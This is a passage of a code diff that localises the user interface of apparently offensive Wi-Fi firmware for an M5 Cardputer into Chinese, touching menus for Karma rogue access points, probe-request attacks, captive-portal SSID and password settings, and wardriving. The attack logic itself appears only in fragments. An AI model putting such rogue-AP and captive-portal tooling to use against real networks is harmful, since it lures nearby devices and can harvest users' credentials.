+  int totalTextHeight = lines.size() * 14;
+  int startY = max(4, (screenHeight - totalTextHeight) / 2);
 
-  // Afficher chaque ligne au centre horizontalement et verticalement
-  for (int i = 0; i < lines.size(); i++) {
-    String line = lines[i];
-    int lineWidth = line.length() * charWidth;
-    int startX = (screenWidth - lineWidth) / 2;  // Calculer la position X pour centrer
+  for (size_t idx = 0; idx < lines.size(); idx++) {
+    String line = lines[idx];
+    int lineWidth = M5.Display.textWidth(line);
+    int startX = max(4, (screenWidth - lineWidth) / 2);
 
-    M5.Display.setCursor(startX, startY + i * 12);
+    M5.Display.setCursor(startX, startY + idx * 14);
     M5.Display.println(line);
   }
 
@@ -7524,8 +7752,8 @@ void loopOptions(std::vector<std::pair<String, std::function<void()>>> &options,
     int menuStartIndex = 0;
 
     M5.Display.clear();
-    M5.Display.setTextSize(1.5);
-    M5.Display.setTextFont(1);
+    evilSetCnFont(M5.Display, 1.5);
+    evilKeepCnFont(M5.Display);
     enterDebounce();
 
     for (int i = 0; i < maxVisibleLines; ++i) {
@@ -7568,7 +7796,7 @@ void loopOptions(std::vector<std::pair<String, std::function<void()>>> &options,
         } else if (kp(KEY_BACKSPACE)) {
             selectionMade = true;
             delay(150); // anti-rebond
-            waitAndReturnToMenu("Back to menu");
+            waitAndReturnToMenu("返回菜单");
         }
 
         if (screenNeedsUpdate) {
@@ -7610,22 +7838,22 @@ void showSettingsMenu() {
     while (continueSettingsMenu) {
         options.clear();
 
-        options.push_back({"Brightness", brightness});
-        options.push_back({soundOn ? "Disable Sound" : "Enable Sound", []() {toggleSound();}});
-        options.push_back({ledOn ? "Disable LED" : "Enable LED", []() {toggleLED();}});
-        options.push_back({String("Switch GPS Pins to: ") + ((gpsPinsMode == 1 || (gpsRxPin == 15 && gpsTxPin == 13)) ? "1/2" : ((gpsPinsMode == 0 || (gpsRxPin == 1 && gpsTxPin == -1)) ? "15/13" : "Auto")), [](){ toggleGpsPinsMode(); }});
-        options.push_back({"Set GPS Baudrate", []() {setGPSBaudrate();}});
-        options.push_back({"Set Startup Image", setStartupImage});
-        options.push_back({"Set Startup Volume", adjustVolume});
-        options.push_back({"Set Startup Sound", setStartupSound});
-        options.push_back({randomOn ? "Disable Random startup" : "Enable Random startup", []() {toggleRandom();}});        options.push_back({"Save current Portal & SSID", []() { saveCurrentPortalAndSSID(); }});
-        options.push_back({ startAtBootFlag ? "Disable Auto at boot" : "Enable Auto at boot", [](){ toggleStartAtBoot(); }});
-        options.push_back({ String("Set Auto Function"), [](){ setBootStartCase(); }});
-        options.push_back({ String("Set Auto Countdown"), [](){ setBootCountdown(); }});
-        options.push_back({"Set CPU Frequency", setCPUFrequency});
-        options.push_back({"Change Portal IP", setCaptivePortalIP});
+        options.push_back({"屏幕亮度", brightness});
+        options.push_back({soundOn ? "关闭音效" : "开启音效", []() {toggleSound();}});
+        options.push_back({ledOn ? "关闭 LED" : "开启 LED", []() {toggleLED();}});
+        options.push_back({String("切换 GPS 引脚为: ") + ((gpsPinsMode == 1 || (gpsRxPin == 15 && gpsTxPin == 13)) ? "1/2" : ((gpsPinsMode == 0 || (gpsRxPin == 1 && gpsTxPin == -1)) ? "15/13" : "自动")), [](){ toggleGpsPinsMode(); }});
+        options.push_back({"设置 GPS 波特率", []() {setGPSBaudrate();}});
+        options.push_back({"设置启动画面", setStartupImage});
+        options.push_back({"设置启动音量", adjustVolume});
+        options.push_back({"设置启动音效", setStartupSound});
+        options.push_back({randomOn ? "关闭随机启动画面/音效" : "开启随机启动画面/音效", []() {toggleRandom();}});        options.push_back({"保存当前门户与 SSID", []() { saveCurrentPortalAndSSID(); }});
+        options.push_back({ startAtBootFlag ? "关闭开机自启" : "开启开机自启", [](){ toggleStartAtBoot(); }});
+        options.push_back({ String("设置开机自启功能"), [](){ setBootStartCase(); }});
+        options.push_back({ String("设置自启倒计时"), [](){ setBootCountdown(); }});
+        options.push_back({"设置 CPU 频率", setCPUFrequency});
+        options.push_back({"更改门户 IP", setCaptivePortalIP});
         
-        loopOptions(options, false, true, "Settings");
+        loopOptions(options, false, true, "系统设置");
         // Vérifie si BACKSPACE a été pressé pour quitter le menu
         if (kp(KEY_BACKSPACE)) {
             continueSettingsMenu = false;
@@ -7649,11 +7877,11 @@ void setCPUFrequency() {
             M5.Display.clear();
             M5.Display.setCursor(5, 5);
             M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
-            M5.Display.println("Select CPU Frequency:");
+            M5.Display.println("选择 CPU 频率:");
 
             int currentFreq = getCpuFrequencyMhz();
             M5.Display.setTextColor(TFT_YELLOW, menuBackgroundColor);
-            M5.Display.println("Current: " + String(currentFreq) + " MHz");
+            M5.Display.println("当前: " + String(currentFreq) + " MHz");
             M5.Display.println("");
 
             for (int i = 0; i < freqs.size(); i++) {
@@ -7684,7 +7912,7 @@ void setCPUFrequency() {
             saveConfigParameter("cpu_freq", selectedFreq); // sauvegarde
             M5.Display.fillScreen(menuBackgroundColor);
             M5.Display.setCursor(5, M5.Display.height() / 2);
-            M5.Display.print("CPU set to " + String(selectedFreq) + " MHz");
+            M5.Display.print("CPU 频率已设为 " + String(selectedFreq) + " MHz");
             Serial.println("CPU Frequency changed to " + String(selectedFreq) + " MHz");
             delay(1000);
             freqSelected = true;
@@ -7712,7 +7940,7 @@ void setGPSBaudrate() {
             M5.Display.clear();
             M5.Display.setCursor(5, 5);
             M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
-            M5.Display.println("Select GPS Baudrate:");
+            M5.Display.println("选择 GPS 波特率:");
 
             for (int i = 0; i < baudrates.size(); i++) {
                 if (i == currentBaudrateIndex) {
@@ -7746,7 +7974,7 @@ void setGPSBaudrate() {
             M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
             M5.Display.fillScreen(menuBackgroundColor);
             M5.Display.setCursor(5, M5.Display.height() / 2);
-            M5.Display.print("GPS Baudrate set to\n" + String(baudrate_gps));
+            M5.Display.print("GPS 波特率已设为\n" + String(baudrate_gps));
             cardgps.end();
             cardgps.begin(baudrate_gps, SERIAL_8N1, gpsRxPin, gpsTxPin);
             delay(1000);
@@ -7800,7 +8028,7 @@ void toggleStartAtBoot() {
   enterDebounce();
   startAtBootFlag = !startAtBootFlag;
   saveConfigParameter("startatboot", startAtBootFlag ? 1 : 0);
-  String msg = String("Auto-start ") + (startAtBootFlag ? "enabled" : "disabled");
+  String msg = String("开机自启已") + (startAtBootFlag ? "启用" : "禁用");
   waitAndReturnToMenu(msg);
 }
 
@@ -7812,14 +8040,14 @@ void setBootStartCase() {
     String s = String(i) + String(". ") + String((const char*)menuItems[i]);
     labels.push_back(s);
   }
-  int sel = menuSelectList(labels, "Select boot case");
+  int sel = menuSelectList(labels, "选择开机自启项");
   if (sel >= 0) {
     caseToStartAtBoot = sel;
     saveConfigParameter("casetostartatboot", sel);
-    String msg = String("Boot case set to ") + String(sel);
+    String msg = String("自启项已设为 ") + String(sel);
     waitAndReturnToMenu(msg);
   } else {
-    waitAndReturnToMenu("Canceled");
+    waitAndReturnToMenu("已取消");
   }
 }
 
@@ -7828,14 +8056,14 @@ void setBootCountdown() {
   // Simple list 0..10 seconds
   std::vector<String> secLabels; secLabels.reserve(11);
   for (int s = 0; s <= 10; ++s) secLabels.push_back(String(s));
-  int idx = menuSelectList(secLabels, "Select countdown (s)");
+  int idx = menuSelectList(secLabels, "选择自启倒计时(秒)");
   if (idx >= 0) {
     bootCountdownSeconds = idx;
     saveConfigParameter("boot_countdown", bootCountdownSeconds);
-    String msg = String("Countdown set to ") + String(bootCountdownSeconds) + String(" s");
+    String msg = String("倒计时已设为 ") + String(bootCountdownSeconds) + String(" 秒");
     waitAndReturnToMenu(msg);
   } else {
-    waitAndReturnToMenu("Canceled");
+    waitAndReturnToMenu("已取消");
   }
 }
 
@@ -7905,7 +8133,7 @@ void setStartupSound() {
 
     if (sounds.size() == 0) {
         M5.Display.clear();
-        M5.Display.println("No sounds found");
+        M5.Display.println("未找到音效文件");
         delay(2000);
         return;
     }
@@ -7923,7 +8151,7 @@ void setStartupSound() {
             M5.Display.clear();
             M5.Display.setCursor(5, 5);
             M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
-            M5.Display.println("Select Startup Sound:");
+            M5.Display.println("选择启动音效:");
 
             for (int i = 0; i < maxDisplayItems && (menuStartIndex + i) < sounds.size(); i++) {
                 int itemIndex = menuStartIndex + i;
@@ -7970,7 +8198,7 @@ void setStartupSound() {
             M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
             M5.Display.fillScreen(menuBackgroundColor);
             M5.Display.setCursor(5, M5.Display.height() / 2);
-            M5.Display.print("Startup sound set to\n" + selectedStartupSound);
+            M5.Display.print("启动音效已设为\n" + selectedStartupSound);
             delay(1000);
             soundSelected = true;
         } else if (kp(KEY_BACKSPACE)) {
@@ -8126,7 +8354,7 @@ void setStartupImage() {
 
     if (images.size() == 0) {
         M5.Display.clear();
-        M5.Display.println("No images found");
+        M5.Display.println("未找到图片文件");
         delay(2000);
         return;
     }
@@ -8146,7 +8374,7 @@ void setStartupImage() {
                 M5.Display.clear();
                 M5.Display.setCursor(5, 5);
                 M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
-                M5.Display.println("Select Startup Image:");
+                M5.Display.println("选择启动画面:");
 
                 for (int i = 0; i < maxDisplayItems && (menuStartIndex + i) < images.size(); i++) {
                     int itemIndex = menuStartIndex + i;
@@ -8214,7 +8442,7 @@ void setStartupImage() {
             M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
             M5.Display.fillScreen(menuBackgroundColor);
             M5.Display.setCursor(5, M5.Display.height() / 2);
-            M5.Display.print("Startup image set to\n" + selectedStartupImage);
+            M5.Display.print("启动画面已设为\n" + selectedStartupImage);
             delay(1000);
             imageSelected = true;
         }
@@ -8253,7 +8481,7 @@ void brightness() {
   int maxBrightness = 255;
 
   M5.Display.clear();
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1.5);
   M5.Display.setTextColor(menuTextUnFocusedColor);
 
   bool brightnessAdjusted = true;
@@ -8290,7 +8518,7 @@ void brightness() {
       float brightnessPercentage = 100.0 * (currentBrightness - minBrightness) / (maxBrightness - minBrightness);
       M5.Display.fillScreen(menuBackgroundColor);
       M5.Display.setCursor(50, M5.Display.height() / 2);
-      M5.Display.print("Brightness: ");
+      M5.Display.print("亮度: ");
       M5.Display.print((int)brightnessPercentage);
       M5.Display.println("%");
       M5.Display.setBrightness(currentBrightness);
@@ -8302,7 +8530,7 @@ void brightness() {
   float finalBrightnessPercentage = 100.0 * (currentBrightness - minBrightness) / (maxBrightness - minBrightness);
   M5.Display.fillScreen(menuBackgroundColor);
   M5.Display.setCursor(5, M5.Display.height() / 2);
-  M5.Display.print("Brightness set to " + String((int)finalBrightnessPercentage) + "%");
+  M5.Display.print("亮度已设为 " + String((int)finalBrightnessPercentage) + "%");
   delay(1000);
 }
 
@@ -8313,7 +8541,7 @@ void adjustVolume() {
     int maxVolume = 255;  // Volume maximum
 
     M5.Display.clear();
-    M5.Display.setTextSize(1.5);
+    evilSetCnFont(M5.Display, 1.5);
     M5.Display.setTextColor(menuTextUnFocusedColor);
 
     bool volumeAdjusted = true;
@@ -8349,7 +8577,7 @@ void adjustVolume() {
             float volumePercentage = 100.0 * (currentVolume - minVolume) / (maxVolume - minVolume);
             M5.Display.fillScreen(menuBackgroundColor);
             M5.Display.setCursor(50, M5.Display.height() / 2);
-            M5.Display.print("Volume: ");
+            M5.Display.print("音量: ");
             M5.Display.print((int)volumePercentage);
             M5.Display.println("%");
             M5Cardputer.Speaker.setVolume(currentVolume);
@@ -8361,7 +8589,7 @@ void adjustVolume() {
     float finalVolumePercentage = 100.0 * (currentVolume - minVolume) / (maxVolume - minVolume);
     M5.Display.fillScreen(menuBackgroundColor);
     M5.Display.setCursor(50, M5.Display.height() / 2);
-    M5.Display.print("Volume set to " + String((int)finalVolumePercentage) + "%");
+    M5.Display.print("音量已设为 " + String((int)finalVolumePercentage) + "%");
     delay(1000);
 }
 
@@ -8461,9 +8689,9 @@ void toggleGpsPinsMode() {
   M5.Display.fillScreen(menuBackgroundColor);
   M5.Display.setCursor(5, M5.Display.height()/2);
   if (gpsPinsMode == 1) {
-    M5.Display.print("GPS Pins set to 15/13");
+    M5.Display.print("GPS 引脚已设为 15/13");
   } else {
-    M5.Display.print("GPS Pins set to 1/2");
+    M5.Display.print("GPS 引脚已设为 1/2");
   }
   delay(1000);
 }
@@ -8588,11 +8816,11 @@ void saveCurrentPortalAndSSID() {
   savePasswordConfig(captivePortalPassword);
   M5.Display.fillScreen(menuBackgroundColor);
   M5.Display.setCursor(10, 10);
-  M5.Display.println("Portal : " + selectedPortalFile.substring(12));
+  M5.Display.println("门户 : " + selectedPortalFile.substring(12));
   M5.Display.println("SSID : " + clonedSSID);
-  M5.Display.println("Password : " + captivePortalPassword);
+  M5.Display.println("密码 : " + captivePortalPassword);
   delay(2000);
-  waitAndReturnToMenu("Config saved"); // même UX que le reste du projet
+  waitAndReturnToMenu("配置已保存"); // même UX que le reste du projet
 }
 
 
@@ -8617,7 +8845,7 @@ void setCaptivePortalIP() {
       M5.Display.clear();
       M5.Display.setCursor(5, 5);
       M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
-      M5.Display.println("Select Captive IP:");
+      M5.Display.println("选择门户 IP:");
 
       for (int i = 0; i < 2; i++) {
         if (i == currentIndexLocal) {
@@ -8647,7 +8875,7 @@ void setCaptivePortalIP() {
       Serial.println("[CFG] Captive IP selection saved: " + String(kCaptiveIPStr[portalIpIndex]));
       M5.Display.fillScreen(menuBackgroundColor);
       M5.Display.setCursor(5, M5.Display.height()/2);
-      M5.Display.print("Captive IP set to ");
+      M5.Display.print("门户 IP 已设为 ");
       M5.Display.println(kCaptiveIPStr[portalIpIndex]);
       delay(1000);
       selected = true;
@@ -9062,7 +9290,7 @@ void packetSnifferKarma(void* buf, wifi_promiscuous_pkt_type_t type) {
 
   if (ssid_count_Karma == 0) {
     M5.Display.setCursor(8, M5.Display.height() / 2 - 10);
-    M5.Display.println("Waiting for probe...");
+    M5.Display.println("等待探测请求...");
   }
 
   if (frame_type == 0x40) { // Probe Request Frame
@@ -9190,14 +9418,14 @@ void drawStartButtonKarma() {
   M5.Display.fillRect(0, M5.Display.height() - 30, M5.Display.width(), 30, TFT_GREEN);
   M5.Display.setCursor(M5.Display.width() / 2 - 24 , M5.Display.height() - 20);
   M5.Display.setTextColor(TFT_BLACK);
-  M5.Display.println("Start Sniff");
+  M5.Display.println("开始嗅探");
   M5.Display.setTextColor(TFT_WHITE);
 }
 
 void drawStopButtonKarma() {
   M5.Display.fillRect(0, M5.Display.height() - 27, M5.Display.width(), 27, TFT_RED);
   M5.Display.setCursor(M5.Display.width() / 2 - 60, M5.Display.height() - 20);
-  M5.Display.println("Stop Sniff");
+  M5.Display.println("停止嗅探");
   M5.Display.setTextColor(TFT_WHITE);
 }
 
@@ -9242,24 +9470,24 @@ void stopScanKarma() {
     Serial.println(String(ssid_count_Karma) + " SSIDs saved on SD.");
   } else if (isProbeSniffingMode && ssid_count_Karma > 0) {
     delay(1500);
-    bool saveSSID = confirmPopup("   Save " + String(ssid_count_Karma) + " SSIDs?");
+    bool saveSSID = confirmPopup("   保存 " + String(ssid_count_Karma) + " 个SSID?");
     if (saveSSID) {
       M5.Display.clear();
       M5.Display.setCursor(5 , M5.Display.height() / 2 );
-      M5.Display.println("Saving SSIDs on SD..");
+      M5.Display.println("正在保存SSID到SD卡..");
       for (int i = 0; i < ssid_count_Karma; i++) {
         saveSSIDToFile(ssidsKarma[i].data());
       }
       M5.Display.clear();
       M5.Display.setCursor(5 , M5.Display.height() / 2 );
-      M5.Display.println(String(ssid_count_Karma) + " SSIDs saved on SD.");
+      M5.Display.println("已保存 " + String(ssid_count_Karma) + " 个SSID到SD卡");
       Serial.println(F("-------------------"));
       Serial.println(String(ssid_count_Karma) + " SSIDs saved on SD.");
       Serial.println(F("-------------------"));
     } else {
       M5.Display.clear();
       M5.Display.setCursor(5 , M5.Display.height() / 2 );
-      M5.Display.println("  No SSID saved.");
+      M5.Display.println("  未保存SSID");
     }
     delay(1000);
     for (int i = 0; i < (int)ssidsKarma.size(); ++i) ssidsKarma[i].fill('\0');
@@ -9333,8 +9561,8 @@ void handleMenuInputKarma() {
 
 void drawMenuKarma() {
   M5.Display.clear();
-  M5.Display.setTextSize(1.5);
-  M5.Display.setTextFont(1);
+  evilSetCnFont(M5.Display, 1.5);
+  evilKeepCnFont(M5.Display);
 
   int lineHeight = 12;
   int startX = 0;
@@ -9361,7 +9589,7 @@ void executeMenuItemKarma(int indexKarma) {
     startAPWithSSIDKarma(ssidsKarma[indexKarma].data());
   } else {
     M5.Display.clear();
-    M5.Display.println("Selection invalide!");
+    M5.Display.println("无效选择!");
     delay(1000);
     drawStartButtonKarma();
     currentStateKarma = StartScanKarma;
@@ -9398,12 +9626,12 @@ void startAPWithSSIDKarma(const char* ssid) {
     M5.Display.println(String(ssid));
 
     M5.Display.setCursor(10, 45);
-    M5.Display.print("Left Time: ");
+    M5.Display.print("剩余时间: ");
     M5.Display.print(remainingTime);
     M5.Display.println(" s ");
 
     M5.Display.setCursor(10, 65);
-    M5.Display.print("Connected Client: ");
+    M5.Display.print("已连接客户端: ");
     M5.Display.println(clientCount);
 
     Serial.println(F("---Karma-Attack---"));
@@ -9414,7 +9642,7 @@ void startAPWithSSIDKarma(const char* ssid) {
 
     M5.Lcd.setTextColor(menuTextUnFocusedColor);
     M5.Display.setCursor(33, 110);
-    M5.Display.println(" Stop");
+    M5.Display.println(" 停止");
     M5.Display.display();
 
     if (remainingTime <= 0) {
@@ -9430,12 +9658,12 @@ void startAPWithSSIDKarma(const char* ssid) {
   M5.Display.clear();
   M5.Display.setCursor(15 , M5.Display.height() / 2 );
   if (clientCount > 0) {
-    M5.Display.println("Karma Successful!!!");
+    M5.Display.println("Karma攻击成功!!!");
     Serial.println(F("-------------------"));
     Serial.println(F("Karma Attack worked !"));
     Serial.println(F("-------------------"));
   } else {
-    M5.Display.println(" Karma Failed...");
+    M5.Display.println(" Karma攻击失败...");
     Serial.println(F("-------------------"));
     Serial.println(F("Karma Attack failed..."));
     Serial.println(F("-------------------"));
@@ -9443,7 +9671,7 @@ void startAPWithSSIDKarma(const char* ssid) {
     WiFi.mode(WIFI_STA);
   }
   delay(2000);
-  if (confirmPopup("Save " + String(ssid) + " ?" )) {
+  if (confirmPopup("保存 " + String(ssid) + " ?" )) {
     saveSSIDToFile(ssid);
   }
   lastIndex = -1;
@@ -9465,7 +9693,7 @@ void listProbes() {
   File file = SD.open("/evil/probes.txt", FILE_READ);
   if (!file) {
     Serial.println(F("Failed to open probes.txt"));
-    waitAndReturnToMenu("Failed to open probes.txt");
+    waitAndReturnToMenu("打开 probes.txt 失败");
     return;
   }
 
@@ -9483,7 +9711,7 @@ void listProbes() {
 
   if (numProbes == 0) {
     Serial.println(F("No probes found"));
-    waitAndReturnToMenu("No probes found");
+    waitAndReturnToMenu("未找到探测记录");
     return;
   }
 
@@ -9515,7 +9743,7 @@ void listProbes() {
       } else if (kp(KEY_ENTER) && !keyHandled) {
         Serial.println("SSID selected: " + probes[currentListIndex]);
         clonedSSID = probes[currentListIndex];
-        waitAndReturnToMenu(probes[currentListIndex] + " selected");
+        waitAndReturnToMenu("已选择 " + probes[currentListIndex]);
         return; // Sortie de la fonction après sélection
       } else if (kp(KEY_BACKSPACE)) {
         inMenu = true;
@@ -9530,7 +9758,7 @@ void listProbes() {
 
     if (needDisplayUpdate) {
       M5.Display.clear();
-      M5.Display.setTextSize(1.5);
+      evilSetCnFont(M5.Display, 1.5);
       int y = 1; // Début de l'affichage en y
 
       for (int i = 0; i < maxDisplay; i++) {
@@ -9560,7 +9788,7 @@ void deleteProbe() {
   File file = SD.open("/evil/probes.txt", FILE_READ);
   if (!file) {
     Serial.println(F("Failed to open probes.txt"));
-    waitAndReturnToMenu("Failed to open probes.txt");
+    waitAndReturnToMenu("打开 probes.txt 失败");
     return;
   }
 
@@ -9577,7 +9805,7 @@ void deleteProbe() {
   file.close();
 
   if (numProbes == 0) {
-    waitAndReturnToMenu("No probes found");
+    waitAndReturnToMenu("未找到探测记录");
     return;
   }
 
@@ -9608,17 +9836,17 @@ void deleteProbe() {
         keyHandled = true;
       } else if (kp(KEY_ENTER) && !keyHandled) {
         keyHandled = true;
-        if (confirmPopup("Delete " + probes[currentListIndex] + " probe?")) {
+        if (confirmPopup("删除探测 " + probes[currentListIndex] + " ?")) {
           bool success = removeProbeFromFile("/evil/probes.txt", probes[currentListIndex]);
           if (success) {
             Serial.println(probes[currentListIndex] + " deleted");
-            waitAndReturnToMenu(probes[currentListIndex] + " deleted");
+            waitAndReturnToMenu("已删除 " + probes[currentListIndex]);
           } else {
-            waitAndReturnToMenu("Error deleting probe");
+            waitAndReturnToMenu("删除探测失败");
           }
           return; // Exit after handling delete
         } else {
-          waitAndReturnToMenu("Return to menu");
+          waitAndReturnToMenu("返回菜单");
           return;
         }
       } else if (kp(KEY_BACKSPACE)) {
@@ -9634,7 +9862,7 @@ void deleteProbe() {
 
     if (needDisplayUpdate) {
       M5.Display.clear();
-      M5.Display.setTextSize(1.5);
+      evilSetCnFont(M5.Display, 1.5);
 
       for (int i = 0; i < maxDisplay && i + currentListIndex < numProbes; i++) {
         int probeIndex = currentListIndex + i;
@@ -9697,7 +9925,7 @@ int showProbesAndSelect(String probes[], int numProbes) {
 
     if (needDisplayUpdate) {
       M5.Display.clear();
-      M5.Display.setTextSize(1.5);
+      evilSetCnFont(M5.Display, 1.5);
 
       for (int i = 0; i < maxDisplay && currentListIndex + i < numProbes; i++) {
         int displayIndex = currentListIndex + i;
@@ -9759,22 +9987,22 @@ Delete all probes
 ============================================================================================================================
 */
 void deleteAllProbes() {
-  if (confirmPopup("Delete All Probes ?")) {
+  if (confirmPopup("清空所有探测记录?")) {
     File file = SD.open("/evil/probes.txt", FILE_WRITE);
     if (file) {
       file.close();
-      waitAndReturnToMenu("Deleted successfully");
+      waitAndReturnToMenu("删除成功");
       Serial.println(F("-------------------"));
       Serial.println(F("Probes deleted successfully"));
       Serial.println(F("-------------------"));
     } else {
-      waitAndReturnToMenu("Error..");
+      waitAndReturnToMenu("错误..");
       Serial.println(F("-------------------"));
       Serial.println(F("Error opening file for deletion"));
       Serial.println(F("-------------------"));
     }
   } else {
-    waitAndReturnToMenu("Deletion cancelled");
+    waitAndReturnToMenu("已取消删除");
   }
 }
 
@@ -9898,7 +10126,7 @@ void probeAttack() {
   useCustomProbes = false;
 
   if (!isItSerialCommand) {
-    useCustomProbes = confirmPopup("Use custom probes?");
+    useCustomProbes = confirmPopup("使用自定义探测?");
     M5.Display.clear();
     if (useCustomProbes) {
       customProbes = readCustomProbes("/evil/config/config.txt");
@@ -9922,14 +10150,14 @@ void probeAttack() {
   M5.Display.fillRect(0, M5.Display.height() - 30, M5.Display.width(), 30, TFT_RED);
   M5.Display.setCursor(M5.Display.width() / 2 - 24, M5.Display.height() - 20);
   M5.Display.setTextColor(TFT_WHITE,TFT_RED);
-  M5.Display.println("Stop");
+  M5.Display.println("停止");
   M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
 
   int probesTextX = 0;
   M5.Display.setCursor(probesTextX, 37);
-  M5.Display.println("Probes attack running...");
+  M5.Display.println("探测攻击运行中...");
   M5.Display.setCursor(probesTextX, 52);
-  M5.Display.print("Probes sent: ");
+  M5.Display.print("已发送探测: ");
 
   Serial.println(F("-------------------"));
   Serial.println(F("Starting Probes attack"));
@@ -10323,9 +10551,9 @@ void activateAPForAutoKarma(const char* ssid) {
       newSSIDAvailable = false;
       M5.Display.clear();
       M5.Display.setCursor(5 , 32);
-      M5.Display.println("Karma Successfull !!!");
+      M5.Display.println("Karma攻击成功 !!!");
       M5.Display.setCursor(5 , 48);
-      M5.Display.println("On : " + clonedSSID);
+      M5.Display.println("目标: " + clonedSSID);
       delay(7000);
       WiFi.softAPdisconnect(true);
       karmaSuccess = true;
@@ -10352,13 +10580,13 @@ void displayWaitingForProbe() {
   M5.Display.setCursor(5, 5);
   if (!isWaitingForProbeDisplayed) {
     M5.Display.clear();
-    M5.Display.setTextSize(1.5);
+    evilSetCnFont(M5.Display, 1.5);
     M5.Display.setTextColor(menuTextUnFocusedColor);
     M5.Display.fillRect(0, M5.Display.height() - 30, M5.Display.width(), 60, TFT_RED);
     M5.Display.setCursor(M5.Display.width() / 2 - 54, M5.Display.height() - 20);
-    M5.Display.println("Stop Auto");
+    M5.Display.println("停止自动");
     M5.Display.setCursor(5, M5.Display.height() / 2 - 20);
-    M5.Display.print("Waiting for probe");
+    M5.Display.print("等待探测请求");
 
     isWaitingForProbeDisplayed = true;
   }
@@ -10369,7 +10597,7 @@ void displayWaitingForProbe() {
     probeDisplayState = (probeDisplayState + 1) % 4;
 
     // Calculer la position X pour l'animation des points
-    int textWidth = M5.Display.textWidth("Waiting for probe ");
+    int textWidth = M5.Display.textWidth("等待探测请求 ");
     int x = textWidth;
     int y = M5.Display.height() / 2 - 20;
 
@@ -10387,7 +10615,7 @@ void displayAPStatus(const char* ssid, unsigned long startTime, int autoKarmaAPD
   unsigned long currentTime = millis();
   int remainingTime = autoKarmaAPDuration / 1000 - ((currentTime - startTime) / 1000);
   int clientCount = WiFi.softAPgetStationNum();
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1.5);
   M5.Display.setCursor(5, 5);
   if (!isInitialDisplayDone) {
     M5.Display.clear();
@@ -10397,16 +10625,16 @@ void displayAPStatus(const char* ssid, unsigned long startTime, int autoKarmaAPD
     M5.Display.println(String(ssid));
 
     M5.Display.setCursor(5, 30);
-    M5.Display.print("Left Time: ");
+    M5.Display.print("剩余时间: ");
     M5.Display.setCursor(5, 50);
-    M5.Display.print("Connected Client: ");
+    M5.Display.print("已连接客户端: ");
     // Affichage du bouton Stop
     M5.Display.setCursor(50, M5.Display.height() - 10);
-    M5.Display.println("Stop");
+    M5.Display.println("停止");
 
     isInitialDisplayDone = true;
   }
-  int timeValuePosX = M5.Display.textWidth("Left Time: ");
+  int timeValuePosX = M5.Display.textWidth("剩余时间: ");
   int timeValuePosY = 30;
   M5.Display.fillRect(timeValuePosX, 20 , 25, 20, menuBackgroundColor);
   M5.Display.setTextColor(menuTextUnFocusedColor);
@@ -10414,7 +10642,7 @@ void displayAPStatus(const char* ssid, unsigned long startTime, int autoKarmaAPD
   M5.Display.print(remainingTime);
   M5.Display.print(" s ");
 
-  int clientValuePosX = M5.Display.textWidth("Connected Client: ");
+  int clientValuePosX = M5.Display.textWidth("已连接客户端: ");
   int clientValuePosY = 50;
   M5.Display.fillRect(clientValuePosX, 40 , 25 , 20, menuBackgroundColor);
   M5.Display.setTextColor(menuTextUnFocusedColor);
@@ -10461,16 +10689,16 @@ void wardrivingMode() {
   Serial.println(F("-------------------"));
   M5.Lcd.fillScreen(menuBackgroundColor);
   M5.Lcd.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
-  M5.Lcd.setTextSize(1.5);
+  evilSetCnFont(M5.Lcd, 1.5);
   M5.Display.fillRect(0, M5.Display.height() - 30, M5.Display.width(), 30, TFT_RED);
   M5.Display.setCursor(M5.Display.width() / 2 - 24 , M5.Display.height() - 20);
   M5.Display.setTextColor(TFT_WHITE);
-  M5.Display.println("Stop");
+  M5.Display.println("停止");
   M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
   M5.Lcd.setCursor(0, 10);
-  M5.Lcd.printf("Scanning...");
+  M5.Lcd.printf("扫描中...");
   M5.Lcd.setCursor(0, 30);
-  M5.Lcd.println("No GPS Data");
+  M5.Lcd.println("无GPS数据");
 
   delay(1000);
   if (!SD.exists("/evil/wardriving")) {
@@ -10517,25 +10745,25 @@ void wardrivingMode() {
           gpsDataAvailable = true;
           // Affichage des informations GPS sur l'écran
           M5.Lcd.setCursor(0, 30);
-          M5.Lcd.print("Longitude:");
+          M5.Lcd.print("经度:");
           M5.Lcd.println(String(gps.location.lng(), 6));
           M5.Lcd.setCursor(0, 45);
-          M5.Lcd.print("Latitude:");
+          M5.Lcd.print("纬度:");
           M5.Lcd.println(String(gps.location.lat(), 6));
           M5.Lcd.setCursor(0, 60);
-          M5.Lcd.print("Sattelites:" + String(gps.satellites.value()));
+          M5.Lcd.print("卫星数:" + String(gps.satellites.value()));
           M5.Lcd.println("  ");
 
           // Altitude
           M5.Lcd.setCursor(0, 75);
-          M5.Lcd.print("Altitude:");
+          M5.Lcd.print("海拔:");
           M5.Lcd.print(String(gps.altitude.meters(), 2) + "m");
           M5.Lcd.println("  ");
 
           // Date et Heure
           String dateTime = formatTimeFromGPS();
           M5.Lcd.setCursor(0, 90);
-          M5.Lcd.print("Time:");
+          M5.Lcd.print("时间:");
           M5.Lcd.print(dateTime);
           M5.Lcd.println("  ");
         }
@@ -10589,21 +10817,21 @@ void wardrivingMode() {
       scanStarted = false; // Reset for the next scan
       // Mettre à jour le nombre de WiFi à proximité sur l'écran
       M5.Lcd.setCursor(0, 10);
-      M5.Lcd.printf("Near WiFi: %d  \n", n);
+      M5.Lcd.printf("附近WiFi: %d  \n", n);
     }
 
     if (kp(KEY_ENTER) || kp(KEY_BACKSPACE) ) {
       exitWardriving = true;
       delay(1000);
-      M5.Display.setTextSize(1.5);
-      if (confirmPopup("List Open Networks?")) {
+      evilSetCnFont(M5.Display, 1.5);
+      if (confirmPopup("列出开放网络?")) {
         M5.Lcd.fillScreen(menuBackgroundColor);
         M5.Display.setCursor(5, M5.Display.height() / 2);
-        M5.Display.println("Saving Open Networks");
